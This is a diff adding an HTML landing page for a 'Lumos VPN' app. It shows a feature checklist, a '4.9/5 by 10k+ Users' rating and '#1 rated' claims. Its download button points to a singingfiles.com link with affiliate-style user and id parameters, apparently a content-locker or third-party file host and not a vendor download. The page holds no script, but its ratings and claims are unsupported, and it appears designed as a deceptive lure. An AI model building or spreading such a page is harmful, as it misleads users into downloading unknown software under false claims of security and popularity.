@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lumos VPN - Secure & Fast Proxy</title>
+    <style>
+        /* General Reset */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body {
+            background-color: #0f172a; /* Dark Navy Background */
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Navbar */
+        .nav {
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .logo { font-size: 24px; font-weight: 800; color: #38bdf8; letter-spacing: 1px; }
+
+        /* Main Container */
+        .container {
+            max-width: 600px;
+            width: 90%;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        /* Hero Section */
+        .hero-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            line-height: 1.2;
+        }
+        
+        p.subtext {
+            color: #94a3b8;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Feature Box */
+        .features {
+            background: #1e293b;
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid #334155;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        .feature-item:last-child { margin-bottom: 0; }
+        
+        .check {
+            color: #4ade80; /* Green Check */
+            margin-right: 12px;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        /* The CTA Button */
+        .cta-btn {
+            background: linear-gradient(90deg, #38bdf8, #2563eb);
+            color: white;
+            text-decoration: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            display: inline-block;
+            box-shadow: 0 10px 25px -5px rgba(56, 189, 248, 0.5);
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 30px -10px rgba(56, 189, 248, 0.6);
+        }
+
+        /* Footer / Reviews */
+        .reviews {
+            margin-top: 30px;
+            color: #64748b;
+            font-size: 14px;
+        }
+        .stars { color: #facc15; font-size: 18px; margin-bottom: 5px; }
+
+        /* Animation */
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 400px) {
+            h1 { font-size: 28px; }
+            .cta-btn { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="nav">
+        <div class="logo">🛡️ LUMOS VPN</div>
+    </div>
+
+    <div class="container">
+        <div class="hero-icon">🌍</div>
+
+        <h1>Browse Freely.<br>Total Privacy.</h1>
+        <p class="subtext">Unlock the internet with the world's #1 rated secure proxy app.</p>
+
+        <div class="features">
+            <div class="feature-item">
+                <span class="check">✔</span> Hide your IP Address
+            </div>
+            <div class="feature-item">
+                <span class="check">✔</span> Unblock Streaming Content
+            </div>
+            <div class="feature-item">
+                <span class="check">✔</span> Military-Grade Encryption
+            </div>
+            <div class="feature-item">
+                <span class="check">✔</span> 100% Free Download
+            </div>
+        </div>
+
+        <a href="https://singingfiles.com/show.php?l=0&u=2494754&id=71659" class="cta-btn">
+            Download & Protect Now
+        </a>
+
+        <div class="reviews">
+            <div class="stars">★★★★★</div>
+            <p>Rated 4.9/5 by 10k+ Users</p>
+            <p style="margin-top:20px; font-size:12px;">© 2024 Secure App Utility. All rights reserved.</p>
+        </div>
+    </div>
+
+</body>
+</html>
